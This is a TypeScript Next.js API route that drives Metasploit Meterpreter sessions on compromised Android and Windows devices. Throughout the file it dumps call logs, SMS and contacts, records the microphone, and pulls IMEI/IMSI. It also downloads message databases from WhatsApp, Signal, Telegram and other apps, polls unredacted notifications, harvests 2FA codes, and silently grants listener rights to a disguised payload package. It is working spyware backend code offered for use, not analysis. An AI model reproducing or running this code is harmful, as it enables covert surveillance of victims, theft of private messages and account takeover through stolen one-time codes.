/**
 * COMMS INTELLIGENCE API
 *
 * Handles:
 *  - call_log       → dump_calllog via Meterpreter, parse CSV output
 *  - sms            → dump_sms via Meterpreter
 *  - contacts       → dump_contacts via Meterpreter
 *  - record_audio   → record_mic for N seconds, save, return filename
 *  - device_info    → IMEI, IMSI, serial, carrier via sub_info / device_info post modules
 *  - social_extract → download app SQLite DB, parse via sql.js, return records
 */

import { NextResponse } from "next/server";
import { getRpcToken, rpcCall } from "@/lib/msf-rpc";
import { logCapturedFile } from "@/lib/supabase";
import path from "path";
import fs from "fs";
import os from "os";

const PAYLOADS_DIR = process.env.PAYLOADS_DIR ?? path.join(os.homedir(), "msf-payloads");
const COMMS_DIR = path.join(PAYLOADS_DIR, "comms");

function ensureDir(d: string) {
  if (!fs.existsSync(d)) fs.mkdirSync(d, { recursive: true });
}

// ── Meterpreter helpers ─────────────────────────────────────────

async function meterWrite(token: string, sessionId: number, cmd: string) {
  await rpcCall("session.meterpreter_write", [sessionId, cmd + "\n"], token);
}

async function meterRead(token: string, sessionId: number, maxWait = 15000): Promise<string> {
  const start = Date.now();
  let out = "";
  while (Date.now() - start < maxWait) {
    const res = await rpcCall<{ data?: string }>("session.meterpreter_read", [sessionId], token);
    if (res.data) out += res.data;
    if (out.includes("meterpreter >") || out.includes(">>>")) break;
    await new Promise((r) => setTimeout(r, 500));
  }
  return out;
}

// ── Parse dump_calllog text output ──────────────────────────────
function parseCallLog(raw: string) {
  // Meterpreter dump_calllog outputs lines like:
  // [Call Log] +15551234567 | 60 | INCOMING | 2024-01-01 12:00:00
  const records = [];
  const lines = raw.split(/\r?\n/);
  for (const line of lines) {
    const m = line.match(/\[Call Log\]\s+(.+?)\s+\|\s+(\d+)\s+\|\s+(\w+)\s+\|\s+(.+)/i)
      ?? line.match(/number=(.+?),.*duration=(\d+),.*type=(\w+),.*date=(.+)/i);
    if (m) {
      records.push({
        number: m[1].trim(),
        duration: parseInt(m[2]) || 0,
        type: m[3].trim().toUpperCase() as "INCOMING" | "OUTGOING" | "MISSED",
        timestamp: m[4].trim(),
      });
    }
  }
  return records;
}

// ── Parse dump_sms text output ──────────────────────────────────
function parseSmsOutput(raw: string) {
  const records = [];
  const blocks = raw.split(/\[SMS\s+\d+\]/i);
  for (const block of blocks.slice(1)) {
    const num = block.match(/number\s*:\s*(.+)/i)?.[1]?.trim() ?? "";
    const body = block.match(/body\s*:\s*([\s\S]+?)(?=\w+\s*:|$)/i)?.[1]?.trim() ?? "";
    const type = block.match(/type\s*:\s*(\w+)/i)?.[1]?.toUpperCase() ?? "INBOX";
    const date = block.match(/date\s*:\s*(.+)/i)?.[1]?.trim() ?? "";
    records.push({ address: num, body, type: type as "INBOX" | "SENT" | "DRAFT", date, read: true });
  }
  return records;
}

// ── Parse dump_contacts text output ─────────────────────────────
function parseContacts(raw: string) {
  const records: Array<{ name: string; phones: string[]; emails: string[] }> = [];
  const blocks = raw.split(/\[Contact\s+\d+\]/i);
  for (const block of blocks.slice(1)) {
    const name = block.match(/name\s*:\s*(.+)/i)?.[1]?.trim() ?? "Unknown";
    const phones = [...block.matchAll(/phone\s*:\s*(.+)/ig)].map((m) => m[1].trim());
    const emails = [...block.matchAll(/email\s*:\s*(.+)/ig)].map((m) => m[1].trim());
    records.push({ name, phones, emails });
  }
  return records;
}

// ── Parse device/sub info ───────────────────────────────────────
function parseDeviceInfo(raw: string): Record<string, string> {
  const info: Record<string, string> = {};
  const patterns: [string, RegExp][] = [
    ["IMEI",     /IMEI\s*[:\-]?\s*([0-9\-]+)/i],
    ["IMSI",     /IMSI\s*[:\-]?\s*([0-9]+)/i],
    ["MSISDN",   /MSISDN\s*[:\-]?\s*(\+?[0-9]+)/i],
    ["Carrier",  /(?:carrier|operator|network)\s*[:\-]?\s*(.+)/i],
    ["Model",    /(?:model|device)\s*[:\-]?\s*(.+)/i],
    ["Android",  /android\s+version\s*[:\-]?\s*(.+)/i],
    ["Serial",   /serial\s*[:\-]?\s*([A-Z0-9]+)/i],
    ["Build",    /build\s*[:\-]?\s*(.+)/i],
    ["MAC",      /(?:mac|wifi.mac)\s*[:\-]?\s*([\da-fA-F:]+)/i],
    ["BT_MAC",   /bluetooth.mac\s*[:\-]?\s*([\da-fA-F:]+)/i],
  ];
  for (const [key, rx] of patterns) {
    const m = raw.match(rx);
    if (m) info[key] = m[1].trim().slice(0, 80);
  }
  // Also grab any key:value pairs
  for (const m of raw.matchAll(/^\s*(\w[\w\s]+?)\s*:\s*(.+)$/mg)) {
    const k = m[1].trim();
    if (k.length < 30 && !info[k]) info[k] = m[2].trim().slice(0, 80);
  }
  return info;
}

// ── SQLite parse via sql.js (WASM) ──────────────────────────────
async function parseSqliteFile(filePath: string, query: string): Promise<Record<string, unknown>[]> {
  try {
    // Dynamic import avoids SSR issues
    const initSqlJs = (await import("sql.js")).default;
    const SQL = await initSqlJs({
      // sql.js WASM file — use CDN fallback if not bundled
      locateFile: (f: string) => `https://cdnjs.cloudflare.com/ajax/libs/sql.js/1.10.3/${f}`,
    });
    const buf = fs.readFileSync(filePath);
    const db = new SQL.Database(buf);
    const res = db.exec(query);
    if (!res.length) return [];
    const { columns, values } = res[0];
    return values.map((row) => Object.fromEntries(columns.map((c, i) => [c, row[i]])));
  } catch {
    return [];
  }
}

// ── Social app → database query map ─────────────────────────────
const SOCIAL_DB_CONFIG: Record<string, {
  remotePath: string;
  localName: string;
  query: string;
  fallbackQuery?: string;
}> = {
  whatsapp:   { remotePath: "/data/data/com.whatsapp/databases/msgstore.db",       localName: "whatsapp_msgs.db",   query: "SELECT key_remote_jid as contact, data as message, timestamp, status FROM messages ORDER BY timestamp DESC LIMIT 500" },
  telegram:   { remotePath: "/data/data/org.telegram.messenger/files/cache4.db",    localName: "telegram_msgs.db",  query: "SELECT dialog_id, message, date, from_id FROM messages ORDER BY date DESC LIMIT 500" },
  signal:     { remotePath: "/data/data/org.thoughtcrime.securesms/databases/signal.db", localName: "signal.db",    query: "SELECT address, body, date, type FROM sms ORDER BY date DESC LIMIT 500" },
  fb_msg:     { remotePath: "/data/data/com.facebook.orca/databases/threads_db2",   localName: "messenger.db",      query: "SELECT thread_key, snippet, timestamp_ms FROM threads ORDER BY timestamp_ms DESC LIMIT 300" },
  instagram:  { remotePath: "/data/data/com.instagram.android/databases/direct.db", localName: "instagram_dm.db",   query: "SELECT thread_id, preview_message, last_activity_at FROM direct_v2_threads ORDER BY last_activity_at DESC LIMIT 300" },
  snapchat:   { remotePath: "/data/data/com.snapchat.android/databases/main.db",    localName: "snapchat.db",        query: "SELECT senderId, text, timestamp FROM MesaMessage ORDER BY timestamp DESC LIMIT 300" },
  tiktok:     { remotePath: "/data/data/com.zhiliaoapp.musically/databases/IM.db",  localName: "tiktok_im.db",      query: "SELECT uid, content, create_time FROM messages ORDER BY create_time DESC LIMIT 300" },
  twitter:    { remotePath: "/data/data/com.twitter.android/databases/app.db",      localName: "twitter.db",         query: "SELECT sender_id, text, created_at FROM direct_messages ORDER BY created_at DESC LIMIT 300" },
  discord:    { remotePath: "/data/data/com.discord/databases/discord.db",          localName: "discord.db",         query: "SELECT channel_id, content, timestamp FROM messages ORDER BY timestamp DESC LIMIT 300" },
  viber:      { remotePath: "/data/data/com.viber.voip/databases/viber_messages",   localName: "viber.db",           query: "SELECT address, body, date FROM messages ORDER BY date DESC LIMIT 300" },
  wechat:     { remotePath: "/data/data/com.tencent.mm/MicroMsg/",                  localName: "wechat.db",          query: "SELECT talker, content, createTime FROM message ORDER BY createTime DESC LIMIT 300" },
  line:       { remotePath: "/data/data/jp.naver.line.android/databases/naver_line",localName: "line.db",            query: "SELECT chat_id, content, created_time FROM chat_history ORDER BY created_time DESC LIMIT 300" },
  skype:      { remotePath: "/data/data/com.skype.raider/databases/main.db",        localName: "skype.db",           query: "SELECT author, body_xml, timestamp FROM Messages ORDER BY timestamp DESC LIMIT 300" },
  gmail:      { remotePath: "/data/data/com.google.android.gm/databases/bigTopDataDB.db", localName: "gmail.db",    query: "SELECT fromAddress, subject, snippet FROM conversations ORDER BY timestamp DESC LIMIT 200" },
  gmsg:       { remotePath: "/data/data/com.google.android.apps.messaging/databases/bugle_db", localName: "gmsg.db",query: "SELECT address, text, received_timestamp FROM messages ORDER BY received_timestamp DESC LIMIT 500" },
};

// ── Notification record type ─────────────────────────────────────────────────
interface NotifRecord {
  pkg: string;
  appLabel: string;
  title: string;
  text: string;
  subText?: string;
  when: string;
  channel?: string;
  priority?: string;
  isOtp: boolean;
  otpCode?: string;
  _ts: number;
}

// ── Active notification pollers (session-scoped) ──────────────────────────────
interface NotifPollerState {
  sessionId: number;
  token: string;
  lastSeen: Set<string>;
  records: NotifRecord[];
  startedAt: string;
}
const notifPollers = new Map<string, NotifPollerState>();

// Trigger one poll cycle (non-blocking)
function triggerNotifPoll(pollId: string, token: string, sessionId: number) {
  (async () => {
    try {
      await rpcCall("session.meterpreter_write", [sessionId, "shell dumpsys notification --noredact\n"], token);
      const start = Date.now();
      let out = "";
      while (Date.now() - start < 20000) {
        const res = await rpcCall<{ data?: string }>("session.meterpreter_read", [sessionId], token);
        if (res.data) out += res.data;
        if (out.includes("meterpreter >") || out.includes(">>>")) break;
        await new Promise((r) => setTimeout(r, 700));
      }
      const state = notifPollers.get(pollId);
      if (!state) return;
      const fresh = parseAndroidNotifications(out);
      for (const r of fresh) {
        const key = `${r.pkg}:${r.title}:${r.text}`;
        if (!state.lastSeen.has(key)) {
          state.lastSeen.add(key);
          state.records.unshift(r);
          if (state.records.length > 500) state.records.pop();
        }
      }
    } catch { /* silently skip failed poll */ }
  })();
}

// ── Parse Android dumpsys notification output ─────────────────────────────────
function parseAndroidNotifications(raw: string): NotifRecord[] {
  const records: NotifRecord[] = [];
  // Each notification block starts with "NotificationRecord(" or "  pkg="
  const blocks = raw.split(/(?=NotificationRecord\(|^\s{4}pkg=)/m);

  for (const block of blocks) {
    if (!block.trim()) continue;
    try {
      const pkg = block.match(/pkg=([^\s,)]+)/)?.[1]
        ?? block.match(/package=([^\s,)]+)/)?.[1] ?? "";
      if (!pkg || pkg.startsWith("android") || pkg === "com.android.systemui") {
        // Skip system UI clutter unless they contain useful content
        if (!block.includes("android.text=")) continue;
      }

      const title = block.match(/android\.title=(.+)/)?.[1]?.trim()
        ?? block.match(/android\.title\(Bundle\)=(.+)/)?.[1]?.trim() ?? "";
      const text  = block.match(/android\.text=(.+)/)?.[1]?.trim()
        ?? block.match(/android\.text\(Bundle\)=(.+)/)?.[1]?.trim()
        ?? block.match(/android\.bigText=(.+)/)?.[1]?.trim() ?? "";
      const subText = block.match(/android\.subText=(.+)/)?.[1]?.trim();
      const channel = block.match(/channel=([^\s)]+)/)?.[1] ?? "";
      const when = block.match(/when=(\d+)/)?.[1];
      const whenMs = when ? parseInt(when) : Date.now();
      const whenIso = new Date(whenMs > 1e12 ? whenMs : whenMs * 1000).toISOString();

      if (!title && !text) continue;

      const combined = `${title} ${text} ${subText ?? ""}`;
      const otpCode = extractOtpCode(combined);

      // Map pkg to human-readable label
      const PKG_LABELS: Record<string, string> = {
        "com.whatsapp": "WhatsApp", "com.whatsapp.w4b": "WA Business",
        "org.telegram.messenger": "Telegram", "org.thoughtcrime.securesms": "Signal",
        "com.facebook.katana": "Facebook", "com.facebook.orca": "Messenger",
        "com.instagram.android": "Instagram", "com.twitter.android": "X/Twitter",
        "com.google.android.gm": "Gmail", "com.android.email": "Email",
        "com.microsoft.office.outlook": "Outlook",
        "com.google.android.apps.messaging": "Messages",
        "com.snapchat.android": "Snapchat", "com.zhiliaoapp.musically": "TikTok",
        "com.discord": "Discord", "com.viber.voip": "Viber",
        "com.paypal.android.p2pmobile": "PayPal", "com.squareup.cash": "CashApp",
        "com.venmo": "Venmo", "com.coinbase.android": "Coinbase",
        "com.binance.dev": "Binance", "com.ubercab": "Uber",
        "com.netflix.mediaclient": "Netflix", "com.amazon.mShop.android.shopping": "Amazon",
        "com.google.android.googlequicksearchbox": "Google",
        "com.android.phone": "Phone", "com.samsung.android.incallui": "Phone",
        "com.android.dialer": "Phone",
      };

      records.push({
        pkg,
        appLabel: PKG_LABELS[pkg] ?? pkg.split(".").pop() ?? pkg,
        title,
        text,
        subText: subText && subText !== "null" ? subText : undefined,
        when: whenIso,
        channel,
        isOtp: !!otpCode,
        otpCode,
        _ts: Date.now(),
      });
    } catch { /* skip malformed block */ }
  }

  return records;
}

// ── Parse notification_log.xml ────────────────────────────────────────────────
function parseNotificationLog(raw: string): NotifRecord[] {
  const records: NotifRecord[] = [];
  const entries = [...raw.matchAll(/<notification\s([^>]+)>/g)];
  for (const m of entries) {
    const attrs = m[1];
    const pkg    = attrs.match(/pkg="([^"]+)"/)?.[1] ?? "";
    const title  = attrs.match(/title="([^"]+)"/)?.[1] ?? "";
    const text   = attrs.match(/text="([^"]+)"/)?.[1] ?? "";
    const when   = attrs.match(/when="([^"]+)"/)?.[1] ?? new Date().toISOString();
    const combined = `${title} ${text}`;
    const otpCode = extractOtpCode(combined);
    if (pkg || title || text) {
      records.push({ pkg, appLabel: pkg.split(".").pop() ?? pkg, title, text, when, isOtp: !!otpCode, otpCode, _ts: Date.now() });
    }
  }
  return records;
}

// ── OTP extraction ────────────────────────────────────────────────────────────
const OTP_PATTERNS = [
  /\b(\d{6})\b(?=.*(?:code|otp|verify|verification|pin|token|auth|one.time|2fa|security))/i,
  /(?:code|otp|pin|token|is)[:\s]+(\d{4,8})\b/i,
  /\b(\d{4,8})\b(?=.*(?:expire|valid|minutes|seconds|use this))/i,
  /G-(\d{6})\b/,           // Google SMS OTP format
  /Your.*code.*?(\d{4,8})/i,
  /(\d{4,8})\s+is your/i,
];

function extractOtpCode(text: string): string | undefined {
  for (const rx of OTP_PATTERNS) {
    const m = text.match(rx);
    if (m) return m[1];
  }
  return undefined;
}

function extractOtpsFromNotifications(raw: string): { source: string; code: string; context: string; ts: string }[] {
  const records = parseAndroidNotifications(raw);
  return records
    .filter((r) => r.isOtp)
    .map((r) => ({ source: r.appLabel, code: r.otpCode!, context: `${r.title}: ${r.text}`, ts: r.when }));
}

function extractOtpsFromSms(raw: string): { source: string; code: string; context: string; ts: string }[] {
  const results: { source: string; code: string; context: string; ts: string }[] = [];
  const lines = raw.split(/\r?\n/);
  for (const line of lines) {
    const code = extractOtpCode(line);
    if (code) {
      const num = line.match(/number=([^,]+)/)?.[1] ?? "SMS";
      results.push({ source: num.trim(), code, context: line.trim().slice(0, 120), ts: new Date().toISOString() });
    }
  }
  return results;
}

// ── Main route handler ──────────────────────────────────────────
export async function POST(request: Request) {
  let body: Record<string, unknown>;
  try { body = await request.json() as Record<string, unknown>; }
  catch { return NextResponse.json({ ok: false, error: "Invalid JSON" }, { status: 400 }); }

  const { session_id, action, app_pkg, app_id, duration } = body as {
    session_id: number; action: string; app_pkg?: string; app_id?: string; duration?: number;
  };

  if (!session_id || !action) {
    return NextResponse.json({ ok: false, error: "session_id and action required" }, { status: 400 });
  }

  try {
    const token = await getRpcToken();

    // ── Call log ────────────────────────────────────────────
    if (action === "call_log") {
      await meterWrite(token, session_id, "dump_calllog");
      const out = await meterRead(token, session_id, 20000);
      const records = parseCallLog(out);
      return NextResponse.json({ ok: true, records, output: out });
    }

    // ── SMS dump ────────────────────────────────────────────
    if (action === "sms") {
      await meterWrite(token, session_id, "dump_sms");
      const out = await meterRead(token, session_id, 20000);
      const records = parseSmsOutput(out);
      return NextResponse.json({ ok: true, records, output: out });
    }

    // ── Contacts dump ───────────────────────────────────────
    if (action === "contacts") {
      await meterWrite(token, session_id, "dump_contacts");
      const out = await meterRead(token, session_id, 20000);
      const records = parseContacts(out);
      return NextResponse.json({ ok: true, records, output: out });
    }

    // ── Device / SIM info ───────────────────────────────────
    if (action === "device_info") {
      await meterWrite(token, session_id, "run post/android/gather/sub_info");
      const out1 = await meterRead(token, session_id, 30000);
      await meterWrite(token, session_id, "run post/android/gather/device_info");
      const out2 = await meterRead(token, session_id, 30000);
      const combined = out1 + "\n" + out2;
      const info = parseDeviceInfo(combined);
      return NextResponse.json({ ok: true, records: [info], output: combined });
    }

    // ── Audio recording ─────────────────────────────────────
    if (action === "record_audio") {
      const dur = Math.min(Number(duration ?? 60), 3600);
      ensureDir(COMMS_DIR);
      const fname = `audio_${Date.now()}.wav`;
      const localPath = path.join(COMMS_DIR, fname);

      await meterWrite(token, session_id, `record_mic -d ${dur} -f ${localPath}`);
      const out = await meterRead(token, session_id, (dur + 10) * 1000);

      // Log to Supabase if file exists
      if (fs.existsSync(localPath)) {
        await logCapturedFile({
          device_id: String(session_id),
          session_id,
          filename: fname,
          filepath: localPath,
          type: "audio",
          size: fs.statSync(localPath).size,
          source: "mic_record",
        }).catch(() => {});
      }

      return NextResponse.json({ ok: true, output: fname });
    }

    // ── Social media extraction ─────────────────────────────
    if (action === "social_extract" && app_id) {
      const cfg = SOCIAL_DB_CONFIG[app_id];
      if (!cfg) {
        return NextResponse.json({ ok: false, error: "Unknown app" });
      }

      ensureDir(COMMS_DIR);
      const localDb = path.join(COMMS_DIR, cfg.localName);

      // Try direct download first
      await meterWrite(token, session_id, `download ${cfg.remotePath} ${localDb}`);
      const dlOut = await meterRead(token, session_id, 30000);

      if (dlOut.includes("Error") || dlOut.includes("permission denied") || !fs.existsSync(localDb)) {
        // Fall back to post module
        if (app_pkg) {
          await meterWrite(token, session_id, `run post/android/capture/app_data -p ${app_pkg}`);
          const postOut = await meterRead(token, session_id, 60000);

          // Try to find extracted file in loot
          if (postOut.includes("saved")) {
            const match = postOut.match(/saved.*?to\s+(.+\.db)/i);
            if (match) {
              const lootPath = match[1].trim();
              if (fs.existsSync(lootPath)) {
                fs.copyFileSync(lootPath, localDb);
              }
            }
          }
        }
      }

      // Parse the DB if we have it
      if (fs.existsSync(localDb)) {
        const records = await parseSqliteFile(localDb, cfg.query);

        // Log to Supabase
        await logCapturedFile({
          device_id: String(session_id),
          session_id,
          filename: cfg.localName,
          filepath: localDb,
          type: "database",
          size: fs.statSync(localDb).size,
          source: `social_${app_id}`,
        }).catch(() => {});

        return NextResponse.json({ ok: true, records, app_id });
      }

      return NextResponse.json({ ok: false, error: "App not installed or access denied", app_id });
    }

    // ── Notification intercept ──────────────────────────────────
    if (action === "notif_dump") {
      // Android: dumpsys notification --noredact gives ALL current notifications
      // including title, text, subtext, app package, timestamp
      await meterWrite(token, session_id, "shell dumpsys notification --noredact");
      const raw = await meterRead(token, session_id, 25000);
      const records = parseAndroidNotifications(raw);
      return NextResponse.json({ ok: true, records, raw, platform: "android" });
    }

    if (action === "notif_log") {
      // Android root: persistent notification history in XML
      await meterWrite(token, session_id, "shell cat /data/system/notification_log.xml 2>/dev/null || cat /data/system_ce/0/notification_history.bin 2>/dev/null");
      const raw = await meterRead(token, session_id, 20000);
      const records = parseNotificationLog(raw);

      // Also try: settings get secure notification_listener_tags
      await meterWrite(token, session_id, "shell settings get secure enabled_notification_listeners");
      const listeners = await meterRead(token, session_id, 5000);
      return NextResponse.json({ ok: true, records, listeners: listeners.trim(), raw });
    }

    if (action === "notif_windows") {
      // Windows: read wpndatabase.db — stores all WNS toast notifications
      const dbPath = "C:\\Users\\%USERNAME%\\AppData\\Local\\Microsoft\\Windows\\Notifications\\wpndatabase.db";
      const localName = `wpn_${session_id}_${Date.now()}.db`;
      const localPath = path.join(COMMS_DIR, localName);
      ensureDir(COMMS_DIR);

      await meterWrite(token, session_id, `download "${dbPath}" ${localPath}`);
      await meterRead(token, session_id, 20000);

      if (!fs.existsSync(localPath)) {
        return NextResponse.json({ ok: false, error: "wpndatabase.db not found or access denied" });
      }

      const initSqlJs = (await import("sql.js")).default;
      const SQL = await initSqlJs({ locateFile: (f: string) => `https://cdnjs.cloudflare.com/ajax/libs/sql.js/1.10.3/${f}` });
      const buf = fs.readFileSync(localPath);
      const db = new SQL.Database(buf);

      let records: Record<string, unknown>[] = [];
      try {
        const res = db.exec(`
          SELECT n.Id, h.PrimaryId as app, n.Payload, n.ExpiryTime, n.ArrivalTime
          FROM Notification n
          JOIN Handler h ON n.HandlerId = h.RecordId
          ORDER BY n.ArrivalTime DESC LIMIT 200
        `);
        if (res.length) {
          const { columns, values } = res[0];
          records = values.map((row) => Object.fromEntries(columns.map((c, i) => [c, row[i]])));
        }
      } catch { /* table may not exist */ }

      fs.unlinkSync(localPath);
      return NextResponse.json({ ok: true, records, platform: "windows" });
    }

    if (action === "notif_poll_start") {
      // Start a background notification monitor: runs dumpsys every 30s
      // Returns a poll_id the client can use to fetch updates
      const pollId = `poll_${session_id}_${Date.now()}`;
      notifPollers.set(pollId, { sessionId: session_id, token, lastSeen: new Set(), records: [], startedAt: new Date().toISOString() });

      // Kick off initial capture
      triggerNotifPoll(pollId, token, session_id);

      return NextResponse.json({ ok: true, pollId, message: "Notification monitor started" });
    }

    if (action === "notif_poll_fetch") {
      const pollId = String(body.poll_id ?? "");
      const since = Number(body.since ?? 0);
      const state = notifPollers.get(pollId);
      if (!state) return NextResponse.json({ ok: false, error: "Poll not found" });

      // Trigger a new capture in background
      triggerNotifPoll(pollId, state.token, state.sessionId);

      const newRecords = state.records.filter((r) => r._ts > since);
      return NextResponse.json({ ok: true, records: newRecords, total: state.records.length, pollId });
    }

    if (action === "notif_poll_stop") {
      const pollId = String(body.poll_id ?? "");
      notifPollers.delete(pollId);
      return NextResponse.json({ ok: true });
    }

    if (action === "notif_otp") {
      // Focused OTP sweep: dump all notifications and filter for 2FA codes
      await meterWrite(token, session_id, "shell dumpsys notification --noredact");
      const raw = await meterRead(token, session_id, 20000);

      // Also check recent SMS for OTPs
      await meterWrite(token, session_id, "dump_sms");
      const smsRaw = await meterRead(token, session_id, 20000);

      const notifOtps = extractOtpsFromNotifications(raw);
      const smsOtps = extractOtpsFromSms(smsRaw);

      return NextResponse.json({ ok: true, notifOtps, smsOtps, combined: [...notifOtps, ...smsOtps] });
    }

    if (action === "notif_enable_listener") {
      // Grant notification listener permission via ADB/root shell
      // This enables the payload's own NotificationListenerService
      await meterWrite(token, session_id, "shell cmd notification allow_listener com.utility.agent/.NotifListener");
      const out1 = await meterRead(token, session_id, 8000);
      // Alternative: settings put secure enabled_notification_listeners
      await meterWrite(token, session_id, "shell settings put secure enabled_notification_listeners com.utility.agent/.NotifListener");
      const out2 = await meterRead(token, session_id, 8000);
      return NextResponse.json({ ok: true, output: out1 + "\n" + out2 });
    }

    return NextResponse.json({ ok: false, error: `Unknown action: ${action}` }, { status: 400 });

  } catch (err: unknown) {
    const msg = err instanceof Error ? err.message : String(err);
    return NextResponse.json({ ok: false, error: msg }, { status: 500 });
  }
}

export async function GET() {
  ensureDir(COMMS_DIR);
  const files = fs.existsSync(COMMS_DIR)
    ? fs.readdirSync(COMMS_DIR).map((f) => {
        const fp = path.join(COMMS_DIR, f);
        const st = fs.statSync(fp);
        return { filename: f, size: st.size, mtime: st.mtime.toISOString() };
      })
    : [];
  return NextResponse.json({ files });
}
